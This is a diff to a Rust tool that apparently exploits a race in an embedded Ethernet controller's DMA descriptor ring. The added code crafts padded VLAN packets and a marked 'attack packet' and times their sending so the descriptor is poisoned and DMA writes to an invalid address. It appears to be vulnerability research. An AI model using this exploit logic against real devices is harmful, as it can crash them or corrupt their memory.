@@ -185,6 +185,9 @@ impl Worker {
                     warn!("ignoring error {e}");
                     break;
                 }
+                // Add a brief delay, so that we're sure this packet doesn't
+                // interfere with the attack sequence.
+                std::thread::sleep(Duration::from_millis(10));
                 if !self.check_alive() {
                     info!("killed with delay {i}");
                     return Ok(i);
@@ -201,17 +204,31 @@ impl Worker {
         let mut padding_packets = vec![];
         for i in 0..4 {
             // Build a padded packet which is long enough to be discarded by the
-            // target, to keep things simple.
+            // target, to keep things simple.  The size matters, because it
+            // determines how long user code takes to process the packet.
             let mut data: Vec<u8> = format!("data-{i}-").as_bytes().to_vec();
             for i in 0..16 {
                 data.push(b'1' + i % 10);
             }
             let (udp, payload_len, tag) = self.builder.udp(&data);
             let (ipv6, ethertype) = self.builder.ipv6(udp, payload_len, tag);
-            let (vlan, ethertype) = self.builder.vlan(0x301, ipv6, ethertype);
+            let (vlan, ethertype) =
+                self.builder.vlan(0x301 + i, ipv6, ethertype);
             let eth = self.builder.eth(vlan, ethertype);
             padding_packets.push(eth);
         }
+
+        // The contents of the attack packet don't matter, but its size does,
+        // because that determines how long the DMA peripheral takes to copy it.
+        //
+        // We use a characteristic string so that we can find it in RAM.
+        let attack_packet = {
+            let mut data: Vec<u8> = b"attack-".to_vec();
+            for i in 0..16 {
+                data.push(b'1' + i % 10);
+            }
+            self.udp_packet(&data)
+        };
 
         trace!("sending attack sequence with delay {delay_micros}");
 
@@ -242,14 +259,18 @@ impl Worker {
         // -----------------------------
         // ^ user position
         // ^ dma position (in "suspended" state)
+        //
+        // The incoming packets have the following VIDs (in descriptor word 0)
+        // -0------1------2------3------
+        // | 301  | 302  | 303  | 304  | (hex values)
+        // -----------------------------
 
         // Sleep until the busy-wait ends, with a user-provided offset to modify
         // the time, compensating for network and turnaround time.
         let sleep_amount = end_time.saturating_duration_since(Instant::now());
         std::thread::sleep(sleep_amount);
 
-        // Remember, at this point, our descriptor ring looks like the
-        // following:
+        // Remember, at this point, our descriptor ring looks like this:
         //
         // -0------1------2------3-----
         // | user | user | user | user |
@@ -279,7 +300,7 @@ impl Worker {
         // peripheral has turned itself off (in ETH_DMADSR):
         //
         //  -0------1------2------3------
-        //  | user | user | user | user |  DMA writes new packet to slot 0
+        //  | user | user | user | user |  DMA writes attack packet to slot 0
         //  -----------------------------
         //         ^ user position
         //         ^ dma position (off)
@@ -296,24 +317,30 @@ impl Worker {
         // packet, DMA will still be waiting:
         //
         //  -0------1------2------3------
-        //  | user | dma  | user | user |  user code processes slot 1
+        //  | dma  | dma  | user | user |  user code processes slot 1
         //  -----------------------------
         //                ^ user position
         //  ^ dma position ("waiting for packet")
         //
         //  -0------1------2------3------
-        //  | user | dma  | user | user | DMA writes new packet to slot 0
+        //  | user | dma  | user | user | DMA writes attack packet to slot 0
         //  -----------------------------
         //                ^ user position
         //         ^ dma position ("waiting for packet")
         //
         // This means that we can tell our critical timing by examining when we
         // start seeing "suspended" readings in our 6-packet burst.
-        self.sender.send_to(padding_packets[0].packet(), None);
+        self.sender.send_to(attack_packet.packet(), None);
 
         // If we successfully poisoned the descriptor, then the DMA peripheral is
         // waiting to write to address 0x301, which is invalid.  Any further
         // communication will fail.
+        //
+        // However, as the system continues processing user packets, it appears
+        // that the DMA peripheral will re-read the descriptor when we next poke
+        // the tail pointer.  This means that we have to send a second packet
+        // right away, while the descriptor is poisoned.
+        self.sender.send_to(attack_packet.packet(), None);
 
         // Receive the initial reply
         if let Some((reply, _reply_time)) =
